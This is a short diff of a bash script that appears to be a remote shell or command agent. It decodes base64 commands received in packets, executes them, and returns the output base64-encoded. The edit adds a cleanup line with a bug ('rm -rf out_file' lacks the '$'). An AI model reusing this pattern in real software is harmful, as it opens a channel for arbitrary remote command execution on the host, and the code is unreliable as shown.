@@ -181,13 +181,15 @@ while true; do
     elif [ "$action" == 'cmd' ]; then
         cmd=$(echo $packet | grep -oP '(?<="cmd": ")[a-zA-Z0-9/\+=]+(?=")' \
             | base64 -d)
+        out_file=$(mktemp)
         err_file=$(mktemp)
-        out=$(eval $cmd 2>$err_file | base64 -w 0)
+        $cmd 1>$out_file  2>$err_file
 
-        response='{"action": "cmd", "message": "'$out'",'
+        response='{"action": "cmd", "message": "'$(cat $out_file | base64 -w 0)'",'
         if [ -s $err_file ]; then
             response=$response'"error": "'$(cat $err_file | base64 -w 0)'",'
         fi
+        rm -rf out_file
         rm -rf err_file
         response=$response'"prompt": "'$(prompt)'"}'
 
